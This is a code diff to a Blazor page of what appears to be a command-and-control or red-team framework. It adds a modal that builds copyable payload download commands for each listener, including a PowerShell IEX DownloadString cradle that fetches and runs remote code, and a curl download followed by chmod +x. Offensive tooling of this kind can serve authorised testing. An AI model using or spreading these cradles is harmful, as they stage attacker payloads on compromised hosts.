@@ -4,6 +4,7 @@
 @using WebCommander.Components
 @inject TeamServerClient Api
 @inject IJSRuntime JSRuntime
+@inject AgentService AgentService
 
 <PageTitle>Web Hosting</PageTitle>
 
@@ -53,6 +54,9 @@ else
                     </td>
                     <td>@FormatFileSize(file.Data?.Length ?? 0)</td>
                     <td>
+                        <button class="btn btn-sm btn-info me-1" @onclick="() => ShowScripts(file)">
+                            <i class="bi bi-file-code"></i> Scripts
+                        </button>
                         <button class="btn btn-sm btn-danger" @onclick="() => DeleteFile(file)">
                             <i class="bi bi-trash"></i> Delete
                         </button>
@@ -101,6 +105,85 @@ else
                             </button>
                         </div>
                     </EditForm>
+                </div>
+            </div>
+        </div>
+    </div>
+}
+
+<!-- Scripts Modal -->
+@if (showScriptsModal && selectedFile != null)
+{
+    <div class="modal fade show d-block" tabindex="-1" style="background-color: rgba(0,0,0,0.5);">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Download Scripts - @selectedFile.Path</h5>
+                    <button type="button" class="btn-close" @onclick="HideScriptsModal"></button>
+                </div>
+                <div class="modal-body">
+                    @{
+                        var listeners = AgentService.GetListeners();
+                    }
+                    @foreach (var listener in listeners)
+                    {
+                        var protocol = listener.Secured ? "https://" : "http://";
+                        var listenerUrl = $"{protocol}{listener.Ip}:{listener.BindPort}";
+                        var fileUrl = $"{listenerUrl}{selectedFile.Path}";
+                        var fileName = selectedFile.Path.TrimStart('/');
+                        if(fileName.Contains("/")) 
+                            fileName = fileName.Substring(fileName.LastIndexOf("/") + 1);
+
+                        <div class="mb-4">
+                            <h6 class="text-primary">Listener: @listener.Name (@listenerUrl)</h6>
+                            
+                            <!-- PowerShell Download -->
+                            <div class="mb-3">
+                                <label class="form-label fw-bold">PowerShell Download</label>
+                                @{
+                                    var psScript = "";
+                                    if (selectedFile.IsPowershell)
+                                    {
+                                        psScript = $"IEX(New-Object Net.WebClient).DownloadString('{fileUrl}')";
+                                    }
+                                    else
+                                    {
+                                        // Use curl-like syntax for powershell binary download
+                                        psScript = $"Invoke-WebRequest -Uri '{fileUrl}' -OutFile '{fileName}'";
+                                    }
+                                }
+                                <div class="input-group">
+                                    <input type="text" class="form-control font-monospace" readonly value="@psScript" />
+                                    <button class="btn btn-outline-secondary" @onclick="() => CopyToClipboard(psScript)">
+                                        <i class="bi bi-clipboard"></i> Copy
+                                    </button>
+                                </div>
+                            </div>
+
+                            <!-- Bash Download -->
+                            <div class="mb-3">
+                                <label class="form-label fw-bold">Bash Download (curl)</label>
+                                @{
+                                    var bashScript = $"curl -s -o {fileName} {fileUrl}";
+                                    if (!selectedFile.IsPowershell)
+                                    {
+                                         bashScript += $" && chmod +x {fileName}";
+                                    }
+                                }
+                                <div class="input-group">
+                                    <input type="text" class="form-control font-monospace" readonly value="@bashScript" />
+                                    <button class="btn btn-outline-secondary" @onclick="() => CopyToClipboard(bashScript)">
+                                        <i class="bi bi-clipboard"></i> Copy
+                                    </button>
+                                </div>
+                            </div>
+
+                            <hr />
+                        </div>
+                    }
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" @onclick="HideScriptsModal">Close</button>
                 </div>
             </div>
         </div>
@@ -229,5 +312,33 @@ else
             len = len / 1024;
         }
         return $"{len:0.##} {sizes[order]}";
+    }
+
+    private bool showScriptsModal = false;
+    private FileWebHost? selectedFile = null;
+
+    private void ShowScripts(FileWebHost file)
+    {
+        selectedFile = file;
+        showScriptsModal = true;
+    }
+
+    private void HideScriptsModal()
+    {
+        showScriptsModal = false;
+        selectedFile = null;
+    }
+
+    private async Task CopyToClipboard(string text)
+    {
+        try
+        {
+            await JSRuntime.InvokeVoidAsync("navigator.clipboard.writeText", text);
+            toast.ShowSuccess("Script copied to clipboard!");
+        }
+        catch (Exception ex)
+        {
+            toast.ShowError("Failed to copy to clipboard", ex.Message);
+        }
     }
 }
